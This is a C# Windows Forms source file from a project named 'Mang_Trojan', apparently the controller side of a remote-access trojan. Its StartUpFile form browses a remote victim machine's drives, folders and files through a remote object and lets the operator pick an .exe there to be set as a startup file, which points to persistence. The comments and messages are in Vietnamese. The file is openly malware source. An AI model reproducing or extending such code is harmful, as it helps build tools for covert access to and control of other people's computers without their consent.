using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class StartUpFile : Form
    {
        RemoteObject.ScreenObject hostInstance;
        private string path;
        private string SelectedDriver = "";
        private ListViewHitTestInfo selected;
        byte[] file;
        string fileName;
         private string setFilePath;

        public string  SetFilePath
        {
            get { return setFilePath; }
            set { setFilePath = value; }
        }
        

      

        public StartUpFile(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.treeView1.ImageList = new ImageList();
            Bitmap folder = Resource1.am_folder;
            this.treeView1.ImageList.Images.Add(folder);

            this.hostInstance = hostInstance;

            this.Text = hostInstance.GetComputerName();
        }

        private void StartUpFile_Load(object sender, EventArgs e)
        {
            string allDriver = hostInstance.GetDrives();
            string[] drivers = allDriver.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
            foreach (string driver in drivers)
            {
                if (driver != string.Empty)
                {
                    treeView1.Nodes.Add(driver);
                }
            }
        }

        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            string _path = e.Node.Text;
            TreeNode temp = e.Node.Parent;
            while (true)
            {
                if (temp != null)
                {
                    _path = temp.Text + "\\" + _path;
                    temp = temp.Parent;
                }
                else
                {
                    break;
                }
            }
            path = SelectedDriver + _path + "\\";

            string AllDirs = hostInstance.GetDirs(path);
            if (!AllDirs.Equals("Thiết bị chưa sẵn sàng.\r\n"))
            {
                string[] dirs = AllDirs.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);

                if (e.Node.Nodes.Count != 0)
                {
                    e.Node.Nodes.Clear();
                }
                foreach (string dir in dirs)
                {
                    if (dir != string.Empty && dir != Environment.NewLine)
                    {

                        e.Node.Nodes.Add(dir);
                    }
                }
                if (e.Node.Nodes.Count != 0)
                {
                    e.Node.Expand();
                }
            }
            else
            {
                MessageBox.Show("Thiết bị chưa sẵn sàng");
            }


            listView1.Items.Clear();
            HandleFiles(path);
        }
        private void HandleFiles(string path)
        {

            string allFiles = hostInstance.GetFiles(path);
            if (!allFiles.Equals("Thiết bị chưa sẵn sàng.\r\n"))
            {
                string[] files = allFiles.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
                foreach (string file in files)
                {
                    if (file != string.Empty)
                    {
                        string[] temp = file.Split(new string[] { "|*|" }, StringSplitOptions.None);
                        ListViewItem item = new ListViewItem(temp[0]);
                        for (int i = 1; i < temp.Length; i++)
                        {
                            item.SubItems.Add(temp[i]);
                        }
                        listView1.Items.Add(item);
                    }
                }
            }
            else
            {
                MessageBox.Show("Lỗi");
            }
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selected = listView1.HitTest(e.X, e.Y);
                contextMenuStrip1.Show(listView1, e.Location);
            }
        }

        private void setToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected.Item != null)
            {
                string ext = selected.Item.Text.Substring(selected.Item.Text.Length - 4);
                if (ext.ToLower() == ".exe")
                {
                    SetFilePath = path + selected.Item.Text;
                    this.DialogResult = DialogResult.OK;
                    this.Dispose();
                }
                else
                {
                    MessageBox.Show("Chỉ sử dụng tập tin có đuôi .exe.");
                }
                       
            }
            else
            {
                MessageBox.Show("Bạn phải chọn tập tin");
            }
             
        }


    }
}
